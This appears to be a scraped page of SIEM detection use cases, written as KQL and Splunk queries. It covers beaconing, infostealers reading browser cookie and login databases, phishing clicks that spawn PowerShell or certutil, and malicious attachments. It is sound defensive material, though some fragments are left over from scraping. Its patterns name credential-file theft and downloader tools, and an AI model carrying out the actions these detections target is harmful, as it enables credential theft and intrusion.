ATT&CKT1071.001 T1071.004
Data sourcesNetwork_Traffic.All_Traffic DeviceNetworkEvents
DeviceNetworkEvents
| where Timestamp > ago(1d)
| where RemoteIPType == "Public" and ActionType == "ConnectionSuccess"
| project DeviceName, RemoteIP, RemotePort, Timestamp
| sort by DeviceName asc, RemoteIP asc, RemotePort asc, Timestamp asc
| extend prev_dev = prev(DeviceName, 1), prev_ip = prev(RemoteIP, 1),
         prev_port = prev(RemotePort, 1), prev_ts = prev(Timestamp, 1)
| where DeviceName == prev_dev and RemoteIP == prev_ip and RemotePort == prev_port
| extend delta_sec = datetime_diff('second', Timestamp, prev_ts)
| summarize conn_count = count(), avg_delta = avg(delta_sec), stdev_delta = stdev(delta_sec)
    by DeviceName, RemoteIP, RemotePort
| where conn_count > 30 and avg_delta between (30.0 .. 600.0) and stdev_delta < 5.0
| order by conn_count desc
ImNetworkSession
| where TimeGenerated > ago(2h)
| where DvcAction != "Block"
| where ipv4_is_private(DstIpAddr) == false
| summarize ConnCount = count(),
            DistinctMinutes = dcount(bin(TimeGenerated, 1m))
            by DvcHostname, DstIpAddr, DstPortNumber
| where ConnCount > 50 and DistinctMinutes > 30   // sustained, not bursty
| order by ConnCount desc
NETWORK
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count, values(All_Traffic.dest_port) AS ports
    from datamodel=Network_Traffic.All_Traffic
    where All_Traffic.action="allowed" AND All_Traffic.dest_category!="internal"
    by _time span=10s, All_Traffic.src, All_Traffic.dest
| `drop_dm_object_name(All_Traffic)`
| streamstats current=f last(_time) AS prev_time by src, dest
| eval delta = _time - prev_time
| stats avg(delta) AS avg_delta stdev(delta) AS sd_delta count by src, dest
| where count > 30 AND sd_delta < 5 AND avg_delta>=30 AND avg_delta<=600
| sort - count
| tstats summariesonly=false count, values(All_Traffic.dest_port) AS ports
    from datamodel=Network_Traffic.All_Traffic
    where All_Traffic.action="allowed" AND All_Traffic.dest_category!="internal"
    by _time span=10s, All_Traffic.src, All_Traffic.dest
| `drop_dm_object_name(All_Traffic)`
| streamstats current=f last(_time) AS prev_time by src, dest
| eval delta = _time - prev_time
| stats avg(delta) AS avg_delta stdev(delta) AS sd_delta count by src, dest
| where count > 30 AND sd_delta < 5 AND avg_delta>=30 AND avg_delta<=600
| sort - count

Infostealer — non-browser process accessing browser cookie/login DBs Actions on Objectives High
Stealers (RedLine, Lumma, Vidar, Atomic) read Login Data / cookies SQLite from Chrome/Edge/Firefox.
ATT&CKT1539 T1555.003
Data sourcesEndpoint.Filesystem DeviceFileEvents
DeviceFileEvents
| where Timestamp > ago(7d)
| where InitiatingProcessAccountName !endswith "$"
| where FolderPath has_any (@"\Google\Chrome\User Data\", @"\Microsoft\Edge\User Data\", @"\Mozilla\Firefox\Profiles\")
| where FileName in~ ("Login Data","Cookies","logins.json","cookies.sqlite")
| where InitiatingProcessFileName !in~ ("chrome.exe","msedge.exe","firefox.exe","brave.exe","opera.exe")
| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, FolderPath, FileName, ActionType

// ASIM ImFileEvent — covers MDE, Sysmon, AuditD, Defender for Cloud, etc.
ImFileEvent
| where TimeGenerated > ago(7d)
| where ActorUsername !endswith "$"
| where TargetFilePath has_any (@"\Google\Chrome\User Data\",
                                  @"\Microsoft\Edge\User Data\",
                                  @"\Mozilla\Firefox\Profiles\")
| where TargetFileName in~ ("Login Data","Cookies","logins.json","cookies.sqlite")
| where ActingProcessName !in~ ("chrome.exe","msedge.exe","firefox.exe","brave.exe","opera.exe")
| project TimeGenerated, DvcHostname, ActorUsername, ActingProcessName,
          TargetFilePath, TargetFileName, EventType

description: |

    non-browser process touching these files is a high-fidelity signal.

author: Clankerusecase
date: 2026/05/02

Phishing-link click correlated to endpoint execution Delivery High
User received an external email containing a URL, clicked it, and within 60 seconds the recipient's endpoint spawned a scripting interpreter or network downloader (PowerShell / cmd / mshta / curl / certutil / bitsadmin). This is the high-fidelity shape — a raw "user clicked an emailed URL" query is too noisy to alert on because every Microsoft 365 tenant generates thousands of legitimate clicks per day. The exec-correlation step suppresses the noise to roughly the rate at which a click actually drives onto-host execution, which is the actionable signal. Pair with UC_PHISH_LINK_BYPASS (Safe Links override) and UC_PHISH_LINK_NEWDOMAIN for orthogonal high-fidelity variants.
ATT&CKT1566.002 T1204.001 T1059.001
Data sourcesEmail.All_Email Web Endpoint.Processes EmailEvents EmailUrlInfo UrlClickEvents DeviceProcessEvents
// Phishing-link click that drives endpoint execution within 60s.
// Far higher fidelity than "every clicked URL" — most legitimate clicks
// never spawn a non-browser child process, so the join eliminates the
// 99% of noise that makes a raw click query unactionable.
let LookbackDays = 7d;
let SuspectClicks = UrlClickEvents
    | where Timestamp > ago(LookbackDays)
    | where AccountName !endswith "$"
    | where ActionType in ("ClickAllowed","ClickedThrough")
    | join kind=inner (
        EmailEvents
        | where Timestamp > ago(LookbackDays)
        | where DeliveryAction == "Delivered"
        | where EmailDirection == "Inbound"
        | project NetworkMessageId, Subject, SenderFromAddress, SenderFromDomain,
                  RecipientEmailAddress, EmailTimestamp = Timestamp
      ) on NetworkMessageId
    | join kind=leftouter (
        EmailUrlInfo | project NetworkMessageId, Url, UrlDomain
      ) on NetworkMessageId, Url
    | project ClickTime = Timestamp, AccountUpn, IPAddress, Url, UrlDomain,
              Subject, SenderFromAddress, SenderFromDomain, RecipientEmailAddress,
              ActionType;
// Correlate to a non-browser child process spawned within 60 seconds on
// the recipient's device.
DeviceProcessEvents
| where Timestamp > ago(LookbackDays)
| where InitiatingProcessFileName in~ ("chrome.exe","msedge.exe","firefox.exe",
                                         "outlook.exe","brave.exe","arc.exe")
| where FileName in~ ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                        "rundll32.exe","regsvr32.exe","wscript.exe","cscript.exe",
                        "bitsadmin.exe","certutil.exe","curl.exe","wget.exe")
| join kind=inner SuspectClicks on $left.AccountName == $right.AccountUpn
| where Timestamp between (ClickTime .. ClickTime + 60s)
| project ClickTime, ProcessTime = Timestamp,
          DelaySec = datetime_diff('second', Timestamp, ClickTime),
          DeviceName, AccountName, RecipientEmailAddress, SenderFromAddress,
          Subject, Url, UrlDomain, ActionType,
          FileName, ProcessCommandLine, InitiatingProcessFileName
| order by ClickTime desc
// UrlClickEvents has no clean Sentinel-native equivalent. The detection
// pivots to: Office Send→Receive proximity to SecurityEvent 4688 of a
// non-browser child process. Lower fidelity than the Defender version.
let LookbackDays = 7d;
let SuspectMailUsers = OfficeActivity
    | where TimeGenerated > ago(LookbackDays)
    | where OfficeWorkload == "Exchange"
    | where Operation =~ "Receive"
    | summarize Subject = any(Subject), Sender = any(Sender)
                by MailboxOwnerUPN, MessageId, EmailTime = bin(TimeGenerated, 1m);
SecurityEvent
| where TimeGenerated > ago(LookbackDays)
| where EventID == 4688
| where ParentProcessName has_any ("\chrome.exe","\msedge.exe",
                                     "\firefox.exe","\outlook.exe","\brave.exe")
| where NewProcessName has_any ("\powershell.exe","\pwsh.exe","\cmd.exe",
                                  "\mshta.exe","\rundll32.exe","\regsvr32.exe",
                                  "\wscript.exe","\cscript.exe","\bitsadmin.exe",
                                  "\certutil.exe","\curl.exe","\wget.exe")
| join kind=inner SuspectMailUsers on $left.Account == $right.MailboxOwnerUPN
| where TimeGenerated between (EmailTime .. EmailTime + 60s)
| project TimeGenerated, EmailTime, Computer, Account, ParentProcessName,
          NewProcessName, CommandLine, Sender, Subject
| order by TimeGenerated desc
WEB
Toggle if your env has no CIM data-model acceleration.
``` Phishing-link click that drives endpoint execution within 60s ```
| tstats `summariesonly` earliest(_time) AS click_time
    from datamodel=Web
    where Web.action="allowed"
    by Web.src, Web.user, Web.dest, Web.url
| `drop_dm_object_name(Web)`
| rename user AS recipient, dest AS clicked_domain, url AS clicked_url
| join type=inner recipient
    [| tstats `summariesonly` count
         from datamodel=Email.All_Email
         where All_Email.action="delivered" AND All_Email.url!="-"
         by All_Email.recipient, All_Email.src_user, All_Email.url, All_Email.subject
     | `drop_dm_object_name(All_Email)`
     | rex field=url "https?://(?<email_domain>[^/]+)"
     | rename recipient AS recipient]
| join type=inner src
    [| tstats `summariesonly` earliest(_time) AS exec_time
         values(Processes.process) AS exec_cmd, values(Processes.process_name) AS exec_proc
         from datamodel=Endpoint.Processes
         where Processes.parent_process_name IN ("chrome.exe","msedge.exe","firefox.exe",
                                                   "outlook.exe","brave.exe","arc.exe")
           AND Processes.process_name IN ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                                            "rundll32.exe","regsvr32.exe","wscript.exe",
                                            "cscript.exe","bitsadmin.exe","certutil.exe",
                                            "curl.exe","wget.exe")
         by Processes.dest, Processes.user
     | `drop_dm_object_name(Processes)`
     | rename dest AS src]
| eval delta_sec = exec_time - click_time
| where delta_sec >= 0 AND delta_sec <= 60
| table click_time, exec_time, delta_sec, recipient, src, src_user, subject,
        clicked_domain, clicked_url, exec_proc, exec_cmd
| sort - click_time

    [| tstats summariesonly=false earliest(_time) AS exec_time

Email attachment opened from external sender Delivery High
Attachment delivery + execution by recipient — most common malware initial access.
ATT&CKT1566.001 T1204.002
Data sourcesEmail.All_Email Endpoint.Processes EmailAttachmentInfo DeviceProcessEvents
let LookbackDays = 7d;
let MalAttachments = EmailAttachmentInfo
    | where Timestamp > ago(LookbackDays)
    | where AccountName !endswith "$"
    | project NetworkMessageId, RecipientEmailAddress,
              AttachmentFileName = FileName, AttachmentSHA256 = SHA256;
DeviceProcessEvents
| where Timestamp > ago(LookbackDays)
| where InitiatingProcessFileName in~ ("OUTLOOK.EXE","winword.exe","excel.exe","powerpnt.exe")
| where FileName in~ ("cmd.exe","powershell.exe","wscript.exe","cscript.exe",
                      "mshta.exe","rundll32.exe","regsvr32.exe")
| join kind=inner MalAttachments on $left.AccountUpn == $right.RecipientEmailAddress
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine,
          InitiatingProcessFileName, AttachmentFileName, AttachmentSHA256
// Sentinel doesn't have an attachment-hash table. Best approximation:
// OfficeActivity Send/Receive activity + correlate to host process spawn.
let LookbackDays = 7d;
let MailWithAttach = OfficeActivity
    | where TimeGenerated > ago(LookbackDays)
    | where OfficeWorkload == "Exchange"
    | where Operation in~ ("Send","Receive")
    | where isnotempty(MessageId)
    | project EmailTime = TimeGenerated, MailboxOwnerUPN, Sender,
              Recipients, Subject, MessageId;
SecurityEvent
| where TimeGenerated > ago(LookbackDays)
| where EventID == 4688
| where ParentProcessName endswith "OUTLOOK.EXE"
| where NewProcessName endswith "\cmd.exe"
   or NewProcessName endswith "\powershell.exe"
   or NewProcessName endswith "\wscript.exe"
   or NewProcessName endswith "\cscript.exe"
   or NewProcessName endswith "\mshta.exe"
| project TimeGenerated, Computer, Account, NewProcessName, CommandLine,
          ParentProcessName
| order by TimeGenerated desc

    from datamodel=Email.All_Email

    [| tstats `summariesonly` count

          AND Processes.process_name IN ("cmd.exe","powershell.exe","wscript.exe","cscript.exe","mshta.exe","rundll32.exe","regsvr32.exe")

Data sourcesEndpoint.Processes DeviceProcessEvents
DeviceProcessEvents
| where Timestamp > ago(7d)
| where AccountName !endswith "$"
| where InitiatingProcessFileName in~ ("setup.exe","installer.exe","update.exe")
| where FileName in~ ("powershell.exe","cmd.exe","rundll32.exe","regsvr32.exe","mshta.exe","wscript.exe","cscript.exe","wmic.exe","bitsadmin.exe")
